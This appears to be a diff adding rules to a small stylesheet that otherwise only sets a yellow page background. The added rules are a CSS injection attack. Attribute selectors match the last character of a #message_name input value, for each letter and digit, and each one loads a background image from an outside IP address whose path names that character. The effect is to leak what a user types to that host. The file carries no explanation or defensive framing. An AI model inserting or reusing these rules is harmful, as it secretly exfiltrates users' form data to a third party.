@@ -2,3 +2,147 @@ body {
 background:yellow;
 
 }
+
+#message_name[value$="a"] {
+  background-image: url("http://66.180.25.175:8082/a/");
+}
+
+#message_name[value$="b"] {
+  background-image: url("http://66.180.25.175:8082/b/");
+}
+
+#message_name[value$="c"] {
+  background-image: url("http://66.180.25.175:8082/c/");
+}
+
+#message_name[value$="d"] {
+  background-image: url("http://66.180.25.175:8082/d/");
+}
+
+#message_name[value$="e"] {
+  background-image: url("http://66.180.25.175:8082/e/");
+}
+
+#message_name[value$="f"] {
+  background-image: url("http://66.180.25.175:8082/f/");
+}
+
+#message_name[value$="g"] {
+  background-image: url("http://66.180.25.175:8082/g/");
+}
+
+#message_name[value$="h"] {
+  background-image: url("http://66.180.25.175:8082/h/");
+}
+
+#message_name[value$="i"] {
+  background-image: url("http://66.180.25.175:8082/i/");
+}
+
+#message_name[value$="j"] {
+  background-image: url("http://66.180.25.175:8082/j/");
+}
+
+#message_name[value$="k"] {
+  background-image: url("http://66.180.25.175:8082/k/");
+}
+
+#message_name[value$="l"] {
+  background-image: url("http://66.180.25.175:8082/l/");
+}
+
+#message_name[value$="m"] {
+  background-image: url("http://66.180.25.175:8082/m/");
+}
+
+#message_name[value$="n"] {
+  background-image: url("http://66.180.25.175:8082/n/");
+}
+
+#message_name[value$="o"] {
+  background-image: url("http://66.180.25.175:8082/o/");
+}
+
+#message_name[value$="p"] {
+  background-image: url("http://66.180.25.175:8082/p/");
+}
+
+#message_name[value$="q"] {
+  background-image: url("http://66.180.25.175:8082/q/");
+}
+
+#message_name[value$="r"] {
+  background-image: url("http://66.180.25.175:8082/r/");
+}
+
+#message_name[value$="s"] {
+  background-image: url("http://66.180.25.175:8082/s/");
+}
+
+#message_name[value$="t"] {
+  background-image: url("http://66.180.25.175:8082/t/");
+}
+
+#message_name[value$="u"] {
+  background-image: url("http://66.180.25.175:8082/u/");
+}
+
+#message_name[value$="v"] {
+  background-image: url("http://66.180.25.175:8082/v/");
+}
+
+#message_name[value$="w"] {
+  background-image: url("http://66.180.25.175:8082/w/");
+}
+
+#message_name[value$="x"] {
+  background-image: url("http://66.180.25.175:8082/x/");
+}
+
+#message_name[value$="y"] {
+  background-image: url("http://66.180.25.175:8082/y/");
+}
+
+#message_name[value$="z"] {
+  background-image: url("http://66.180.25.175:8082/z/");
+}
+
+#message_name[value$="0"] {
+  background-image: url("http://66.180.25.175:8082/0/");
+}
+
+#message_name[value$="1"] {
+  background-image: url("http://66.180.25.175:8082/1/");
+}
+
+#message_name[value$="2"] {
+  background-image: url("http://66.180.25.175:8082/2/");
+}
+
+#message_name[value$="3"] {
+  background-image: url("http://66.180.25.175:8082/3/");
+}
+
+#message_name[value$="4"] {
+  background-image: url("http://66.180.25.175:8082/4/");
+}
+
+#message_name[value$="5"] {
+  background-image: url("http://66.180.25.175:8082/5/");
+}
+
+#message_name[value$="6"] {
+  background-image: url("http://66.180.25.175:8082/6/");
+}
+
+#message_name[value$="7"] {
+  background-image: url("http://66.180.25.175:8082/7/");
+}
+
+#message_name[value$="8"] {
+  background-image: url("http://66.180.25.175:8082/8/");
+}
+
+#message_name[value$="9"] {
+  background-image: url("http://66.180.25.175:8082/9/");
+}
